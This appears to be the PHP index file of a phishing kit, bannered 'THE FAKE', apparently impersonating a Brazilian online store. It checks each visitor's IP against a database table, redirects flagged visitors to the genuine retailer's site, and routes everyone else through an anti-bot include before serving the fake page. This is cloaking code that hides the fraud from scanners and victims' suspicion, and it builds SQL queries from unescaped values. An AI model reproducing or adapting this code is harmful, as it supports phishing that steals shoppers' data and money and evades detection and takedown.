<?php 
session_start();

/*=====================================
▀▀█▀▀ █  █ █▀▀▀    █▀▀▀ █▀▀█ █ ▄▀ █▀▀▀ 
  █   █▀▀█ █▀▀▀ ▀▀ █▀▀▀ █▄▄█ █▀▄  █▀▀▀ 
  █   █  █ █▄▄▄    █    █  █ █  █ █▄▄▄
=====================================*/

require_once("api/db.php");

$ip = base64_encode($_SERVER['REMOTE_ADDR']);
$ip2 = $_SERVER['REMOTE_ADDR'];

$sql = mysqli_query($conn, "SELECT * FROM online WHERE ip='$ip'");
if(mysqli_num_rows($sql) > 0){
while($rowx = mysqli_fetch_array($sql)){ 
$situacao = $rowx["situacao"];
}
if($situacao=="desativo"){
header("Location: https://www.lojavirtual.com.br/");
}else{
$id = addslashes($_GET["id"]);
require_once("bot/block.php");
}
}

//=============

else{

$sql = mysqli_query($conn, "SELECT * FROM online WHERE ip='$ip2'");
if(mysqli_num_rows($sql) > 0){
while($rowx = mysqli_fetch_array($sql)){ 
$situacao = $rowx["situacao"];
}
if($situacao=="desativo"){
header("Location: https://www.lojavirtual.com.br/");
}else{
$id = addslashes($_GET["id"]);
require_once("bot/block.php");
}
}else{
$id = addslashes($_GET["id"]);
require_once("bot/block.php");
}
}


?>